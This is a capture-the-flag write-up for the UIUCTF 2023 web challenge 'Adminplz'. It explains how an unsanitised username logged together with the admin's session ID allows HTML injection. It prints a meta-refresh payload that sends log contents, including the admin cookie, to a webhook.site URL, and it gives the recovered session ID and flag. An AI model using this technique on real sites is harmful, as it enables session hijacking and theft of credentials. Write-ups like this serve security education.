# Adminplz (UIUCTF 2023)

**Challenge category**: Web<br>
**Challenge description**: "your daily dose of ☕"<br>
**Challenge points**: 322<br>
**CTF date**: sab, 01 Lug. 2023, 00:00 UTC — lun, 03 Lug. 2023, 00:00 UTC<br>

## Context

This challenge involves a Log Injection that leads to cookie exfiltration.

## Exploring the challenge

![1](https://github.com/H31s3n-b3rg/CTF_Write-ups/assets/66698256/5ab67534-cd47-4328-bd60-73ab33e3e6d0)

![4](https://github.com/H31s3n-b3rg/CTF_Write-ups/assets/66698256/d673a902-6b96-49e5-97e5-8c8689e861cd)


![2](https://github.com/H31s3n-b3rg/CTF_Write-ups/assets/66698256/be43b485-a783-4e69-90d9-553995228101)

The only thing we can do on this page is login and submit a URL to the admin bot. If we access the <code>/admin</code> endpoint, we will get an error:

![3](https://github.com/H31s3n-b3rg/CTF_Write-ups/assets/66698256/e5169f48-6c01-4e8a-9ee9-ec89a89ce823)

Let's have a look at the Java code.
```javascript
const { chromium } = require('playwright-chromium');
const URL = process.argv[2];

(async () => {
    console.log('running admin bot...')
    const browser = await chromium.launch()
    const context = await browser.newContext()
    context.setDefaultTimeout(2000)
    const page = await context.newPage()
    await page.goto('http://127.0.0.1:8080/')

    // login
    await page.type('input[name=username]', 'admin')
    await page.type('input[name=password]', process.env.ADMIN_PASSWORD)
    await Promise.all([
      page.click('input[type=submit]'),
      page.waitForNavigation({
        waitUntil: 'networkidle0',
      }),
    ]);
    // visit url
    console.log("visiting target...");
    await page.goto(URL);
    await page.waitForTimeout(900000); // 15 min
    await browser.close()
    console.log('Success!')
})();
```
For the bot, the server is on 127.0.0.1 on port 8080. It logs on the server and then visits the submitted URL.
```java
@Component
public class CSP implements Filter {
    @Override
    public void doFilter(ServletRequest request,
                         ServletResponse response,
                         FilterChain chain) throws ServletException, IOException {
        ((HttpServletResponse) response).addHeader("Content-Security-Policy", "default-src 'none';");
        chain.doFilter(request, response);
    }
}

```
CSP is set to <code>default-src 'none'</code>. A very strict policy that prevents any external resources from being loaded and any scripts from running, so no XSS.
```java
@PostMapping(path = "/login", consumes = {MediaType.APPLICATION_FORM_URLENCODED_VALUE})
    public String login(HttpSession session, User user) {
        if (user.getUsername().equals("admin") && !user.getPassword().equals(ADMIN_PASSWORD)) {
            return "not allowed";
        }
        session.setAttribute("user", user);
        return "logged in";
    }
```
We can't log in as admin since we don't know the password, but we can log in as any user, our username will be set accordingly (password isn't checked).
```java
@GetMapping("/admin")
    public Resource admin(HttpServletRequest req, HttpSession session, @RequestParam String view) {
        if (isLoggedIn(session) && view.contains("flag")) {
            logger.warn("user {} [{}] attempted to access restricted view", ((User) session.getAttribute("user")).getUsername(), session.getId());
        }
        return app.getResource(isAdmin(req, session) ? view : "error.html");
    }
```
Here, two things: our username could be written inside a log (<code>/var/log/adminplz/latest.log</code>) without going through any sanitization process and
a resource specified by a user-controllable GET parameter (<code>view</code>) is returned to the admin (if they access the endpoint).
The <code>accessResource()</code> method accepts filenames and URLs (of any protocol).<br>
There is no possibility for an XSS, nor possibility to inject anything on any page. The only file we can inject something into, if we are registered and
the <code>view</code> parameter contains the substring "flag", it is <code>/var/log/adminplz/latest.log</code>. This file can be viewed as HTML by the bot's browser if required (via the <code>/admin</code> endpoint and the <code>view</code> parameter).
Sending a url like <code>http://127.0.0.1:8080/admin?view=file:///var/log/adminplz/latest.log</code> will cause the admin bot to view the log file as an HTML page.
But what can we do? We cannot activate XSS or load any external resources. Therefore, it is impossible to get the content of <code>/flag.html</code>. Can we steal cookies even without XSS? Yes!
If we look at the code above (the admin one), we can see that not only the username is registered, but also the session ID. If the admin visits a url
such as <code>http://127.0.0.1:8080/admin?view=file:///flag.html</code>, its session id (authentication cookie) is written to the log. If we can exfiltrate this,
we can authenticate to the server as admin. There is only text in the log, but we can insert HTML through the username.
How can we exfiltrate the admin cookie with a very strict CSP policy? With a <code>meta</code> tag that redirects the client to a URL that
incorporates part of the content of the log (administrative cookies included) inside it:
```html
.... <html><head><meta http-equiv="refresh" content='0; url=https://webhook.site/a2e16dd2-9690-4246-8c58-abf303c42a4b?exf=

...Log content...

'></head> ....
```
This HTML code could redirect the client to the specified URL, including in the <code>exf</code> parameter all the content written before the single quote. If the server logs an admin event within this content, before injecting the <code>'>\</head\></code> part, we can exfiltrate the admin authentication cookie.

## Attack
Six steps:
+ Login with username <code><html><head><meta http-equiv="refresh" content='0; url=https://webhook.site/a2e16dd2-9690-4246-8c58-abf303c42a4b?exf=</code>.
+ Visit <code>https://instance_server/admin?view=file:///flag.html</code> (it is important that the <code>view</code> parameter contains a valid path (existing file), otherwise an error will be raised and the content of the log will be restored, erasing our previous input).
+ Submit the url <code>https://127.0.0.1:8080/admin?view=file:///flag.html</code> to the admin bot.
+ Login with username <code><html>'>\</head\></code>.
+ Visit <code>https://instance_server/admin?view=file:///flag.html</code>.
+ Submit the url <code>http://127.0.0.1:8080/admin?view=file:///var/log/adminplz/latest.log</code> to the admin bot.

After performing these steps, our server will receive a GET request with all exfiltrated content within a query parameter.

![adminplz_cookie](https://github.com/H31s3n-b3rg/CTF_Write-ups/assets/66698256/de9a0540-c05e-4747-9917-06997257a46a)


We got admin's session ID (<code>36D142A1763851F1DE47DEB881FC2A3A</code>)!
We now need to use this cookie when accessing the <code>/admin</code> endpoint. To access the flag file we need to set the <code>view</code>
parameter to <code>file:///flag.html.</code>, then: <code>https://instance_server/admin?view=file:///flag.html</code>. By visiting this link we will get the flag!

![adminplz_flag](https://github.com/H31s3n-b3rg/CTF_Write-ups/assets/66698256/888aa3a9-0937-4f36-b173-8a7777136c59)

Flag is <code>uiuctf{adminplz_c4n_1_h4v3_s0M3_co0k13s?_b5eab1cc61c26f07e63af7f8}</code>.

